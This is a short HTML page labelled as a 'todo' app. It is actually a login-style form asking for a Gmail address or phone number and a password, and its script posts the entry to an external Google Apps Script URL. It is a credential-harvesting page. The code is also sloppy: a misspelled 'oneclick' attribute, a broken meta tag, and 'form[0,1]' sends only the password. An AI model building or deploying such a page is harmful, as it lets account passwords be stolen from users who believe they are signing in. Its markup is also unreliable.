<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta http-equiv-"X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>todo</title>
</head>
<body>
    <form>
        <input type="text" class="todo" placeholder="Enter gmail or number">
        <input type="text" class="pass" placeholder='Entet your password'> 
        <button class="add" type="button" oneclick="addData()" > Get </button>
</form>
        

<script>
    let api = "https://script.google.com/macros/s/AKfycbzDWvZCyIlSkxonNlNGWa_JdLGOW-1i947UxB-e3i1XL-T2w3KtUK8CMYdXDGH8jlGMXw/exec";
    let form = document.querySelector("form");
    let add = document.querySelector(".add");
    function addData() {
        add.textContent="getting"
        let obj = {
                       todo:form[0,1].value
        }
        fetch(api,{
            method:"POST",
            body:JSON.stringify(obj)
        })
         .then(res=> res.text())
         .then(data => {
             alert(data)
             add.textContent="Get"
          form.reset();
         });
    }
    
</script>
</body>
</html>
